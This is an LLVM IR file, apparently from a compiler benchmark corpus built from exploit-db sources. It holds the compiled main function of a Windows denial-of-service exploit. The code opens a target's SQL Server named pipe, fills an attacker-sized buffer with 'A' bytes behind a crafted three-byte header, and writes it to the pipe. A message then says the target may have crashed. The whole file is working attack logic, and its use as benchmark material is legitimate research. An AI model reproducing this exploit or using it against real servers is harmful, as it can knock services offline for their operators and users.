; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_65.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_65.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [13 x i8] c"Starting...\0A\00", align 1
@.str.1 = private unnamed_addr constant [23 x i8] c"\\\\%s\\\\.\\pipe\\sql\\query\00", align 1
@.str.2 = private unnamed_addr constant [14 x i8] c"Error!server\0A\00", align 1
@.str.3 = private unnamed_addr constant [15 x i8] c"malloc error!\0A\00", align 1
@.str.4 = private unnamed_addr constant [22 x i8] c"Connecting Server...\0A\00", align 1
@GENERIC_READ = common dso_local global i32 0, align 4
@GENERIC_WRITE = common dso_local global i32 0, align 4
@OPEN_EXISTING = common dso_local global i32 0, align 4
@INVALID_HANDLE_VALUE = common dso_local global i64 0, align 8
@.str.5 = private unnamed_addr constant [25 x i8] c"Error!Connect server!%d\0A\00", align 1
@PIPE_READMODE_MESSAGE = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [34 x i8] c"Error!SetNamedPipeHandleState.%d\0A\00", align 1
@.str.7 = private unnamed_addr constant [23 x i8] c"\0A\09Error!WriteFile.%d\0A\0A\00", align 1
@.str.8 = private unnamed_addr constant [58 x i8] c"When see the error message, the target may be crashed!!\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [50 x i8], align 16
  %7 = alloca i8*, align 8
  %8 = alloca i64, align 8
  %9 = alloca i64, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* null, i8** %7, align 8
  store i64 0, i64* %8, align 8
  store i32 0, i32* %10, align 4
  %13 = call i32 (...) @Usage()
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i64 0, i64 0))
  %15 = load i32, i32* %4, align 4
  %16 = icmp ne i32 %15, 3
  br i1 %16, label %17, label %18

17:                                               ; preds = %2
  br label %93

18:                                               ; preds = %2
  %19 = load i8**, i8*** %5, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 1
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 @strlen(i8* %21)
  %23 = icmp slt i32 %22, 20
  br i1 %23, label %24, label %30

24:                                               ; preds = %18
  %25 = getelementptr inbounds [50 x i8], [50 x i8]* %6, i64 0, i64 0
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 1
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 @sprintf(i8* %25, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.1, i64 0, i64 0), i8* %28)
  br label %32

30:                                               ; preds = %18
  %31 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.2, i64 0, i64 0))
  br label %93

32:                                               ; preds = %24
  %33 = load i8**, i8*** %5, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 2
  %35 = load i8*, i8** %34, align 8
  %36 = call i64 @atol(i8* %35)
  store i64 %36, i64* %8, align 8
  %37 = load i64, i64* %8, align 8
  %38 = add i64 %37, 2
  %39 = call i64 @malloc(i64 %38)
  %40 = inttoptr i64 %39 to i8*
  store i8* %40, i8** %7, align 8
  %41 = load i8*, i8** %7, align 8
  %42 = icmp eq i8* null, %41
  br i1 %42, label %43, label %45

43:                                               ; preds = %32
  %44 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.3, i64 0, i64 0))
  br label %93

45:                                               ; preds = %32
  %46 = load i8*, i8** %7, align 8
  %47 = load i64, i64* %8, align 8
  %48 = add i64 %47, 2
  %49 = call i32 @memset(i8* %46, i8 signext 0, i64 %48)
  %50 = load i8*, i8** %7, align 8
  %51 = load i64, i64* %8, align 8
  %52 = call i32 @memset(i8* %50, i8 signext 65, i64 %51)
  %53 = load i8*, i8** %7, align 8
  store i8 18, i8* %53, align 1
  %54 = load i8*, i8** %7, align 8
  %55 = getelementptr inbounds i8, i8* %54, i64 1
  store i8 1, i8* %55, align 1
  %56 = load i8*, i8** %7, align 8
  %57 = getelementptr inbounds i8, i8* %56, i64 2
  store i8 0, i8* %57, align 1
  %58 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.4, i64 0, i64 0))
  %59 = getelementptr inbounds [50 x i8], [50 x i8]* %6, i64 0, i64 0
  %60 = load i32, i32* @GENERIC_READ, align 4
  %61 = load i32, i32* @GENERIC_WRITE, align 4
  %62 = or i32 %60, %61
  %63 = load i32, i32* @OPEN_EXISTING, align 4
  %64 = call i64 @CreateFile(i8* %59, i32 %62, i32 0, i32* null, i32 %63, i32 0, i32* null)
  store i64 %64, i64* %12, align 8
  %65 = load i64, i64* @INVALID_HANDLE_VALUE, align 8
  %66 = load i64, i64* %12, align 8
  %67 = icmp eq i64 %65, %66
  br i1 %67, label %68, label %71

68:                                               ; preds = %45
  %69 = call i32 (...) @GetLastError()
  %70 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.5, i64 0, i64 0), i32 %69)
  br label %93

71:                                               ; preds = %45
  %72 = load i32, i32* @PIPE_READMODE_MESSAGE, align 4
  store i32 %72, i32* %11, align 4
  %73 = load i64, i64* %12, align 8
  %74 = call i64 @SetNamedPipeHandleState(i64 %73, i32* %11, i32* null, i32* null)
  store i64 %74, i64* %9, align 8
  %75 = load i64, i64* %9, align 8
  %76 = icmp ne i64 %75, 0
  br i1 %76, label %80, label %77

77:                                               ; preds = %71
  %78 = call i32 (...) @GetLastError()
  %79 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.6, i64 0, i64 0), i32 %78)
  br label %93

80:                                               ; preds = %71
  %81 = load i64, i64* %12, align 8
  %82 = load i8*, i8** %7, align 8
  %83 = load i64, i64* %8, align 8
  %84 = add i64 %83, 1
  %85 = call i64 @WriteFile(i64 %81, i8* %82, i64 %84, i32* %10, i32* null)
  store i64 %85, i64* %9, align 8
  %86 = load i64, i64* %9, align 8
  %87 = icmp ne i64 %86, 0
  br i1 %87, label %92, label %88

88:                                               ; preds = %80
  %89 = call i32 (...) @GetLastError()
  %90 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.7, i64 0, i64 0), i32 %89)
  %91 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.8, i64 0, i64 0))
  br label %93

92:                                               ; preds = %80
  br label %93

93:                                               ; preds = %92, %88, %77, %68, %43, %30, %17
  ret i32 0
}

declare dso_local i32 @Usage(...) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*) #1

declare dso_local i64 @atol(i8*) #1

declare dso_local i64 @malloc(i64) #1

declare dso_local i32 @memset(i8*, i8 signext, i64) #1

declare dso_local i64 @CreateFile(i8*, i32, i32, i32*, i32, i32, i32*) #1

declare dso_local i32 @GetLastError(...) #1

declare dso_local i64 @SetNamedPipeHandleState(i64, i32*, i32*, i32*) #1

declare dso_local i64 @WriteFile(i64, i8*, i64, i32*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
